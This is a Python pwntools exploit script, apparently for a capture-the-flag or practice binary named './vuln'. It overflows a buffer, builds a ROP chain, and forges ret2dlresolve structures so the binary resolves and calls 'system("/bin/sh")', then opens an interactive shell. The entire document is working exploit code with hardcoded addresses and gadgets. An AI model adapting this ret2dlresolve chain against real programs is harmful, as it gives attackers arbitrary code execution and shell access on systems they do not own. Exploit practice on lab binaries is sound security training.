import struct
from pwn import *
elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
exploit_log_level = 1 # 0 : No log | 1 : Verbose | 2 : Debug

if exploit_log_level >= 2:
	context.log_level = 'debug'

def make_ropchain(padding, dlresolve):
	payload = bytearray()
	payload += ('A'*padding).encode()
	payload += struct.pack("I", 0x08049030) # read@plt
	payload += struct.pack("I", 0x0804921a) # ropgadget : pop edi; pop ebp; ret
	payload += struct.pack("I", 0x00000000) # args[0] -> Null
	payload += struct.pack("I", dlresolve.data_addr) # args[1] -> Symbol name address (dlresolve.data_addr)
	payload += struct.pack("I", 0x08049020) # [plt_init] system(dlresolve.data_addr+36) so dlresolve.data_addr+36 is the argument that will use system when it will get executed
	payload += struct.pack("I", dlresolve.reloc_index) # reloc index (dlresolve.reloc_index)
	payload += ("AAAA").encode() # return address (not important)
	payload += struct.pack("I", dlresolve.data_addr+36) # args[0] of system which will be written in the dlresolve_payload
	return payload
def make_dlresolve_payload(dlresolve, arg="/bin/sh"):
	# like dlresolve_payload.payload
	# Write the symbol (system) to Symbol name addr
	payload = bytearray()
	payload += b"system"
	payload += b"\x00"
	payload += b"acaaa"
	# The Elf32_Sym structure
	payload += struct.pack("I", dlresolve.reloc_index+96) # index/offset of the symbol system in the structure
	payload += struct.pack("I", 0x00000000)*3 # other values in the struct (they're not important)
	# The Elf32_Rel structure
	payload += struct.pack("I", dlresolve_payload.data_addr) # Symbol name address (system)
	payload += struct.pack("I", 0x0004c007)
	# Finally, the argument of the symbol
	payload += arg.encode() # which will be written to dlresolve.data_addr+36 and
	payload += b"\x00"
	return payload

def print_bytes(a):
	print("[", end="")
	for elem in a:
		print(str(hex(elem))+", ", end="")
		if(elem == 0x0a):
			print("]\n[", end="")
	print("]")
def print_x(a):
	c = []
	i = 0
	j = 0
	for i in range(len(a)-4):
		c.append(bytearray())
	
		c[i] = bytearray([a[i], a[i+1], a[i+2], a[i+3]])

	print("[", end="")
	for elem in c:
		x = struct.unpack("I", elem)
		print(hex(x[0])+", ", end="")
	print("]")

dlresolve_payload = Ret2dlresolvePayload(elf, symbol='system', args=["/bin/sh"])

if exploit_log_level >= 1:
	print("[*] Data addr : "+str(hex(dlresolve_payload.data_addr)))
	print("[*] Reloc index : "+str(hex(dlresolve_payload.reloc_index)))

payload1 = make_ropchain(76, dlresolve_payload)
payload2 = make_dlresolve_payload(dlresolve_payload, "/bin/sh")

fullpayload = payload1
fullpayload += "\n".encode()
fullpayload += payload2
# full payload for any usage

if exploit_log_level >= 2:
	print("[@] Full exploit payload : ")
	print_x(payload1)
	#print_x(dlresolve_payload.payload)
	print_x(payload2)

if exploit_log_level >= 1:
	print("[*] Sending the first ropchain...")
p.sendline(payload1)
if exploit_log_level >= 1:
	print("[*] Sending the dlresolve payload...")
# now the read is called and we pass all the relevant structures in
p.sendline(payload2) # if it's not working you can pass it the dlresolve_payload.payload

p.interactive()
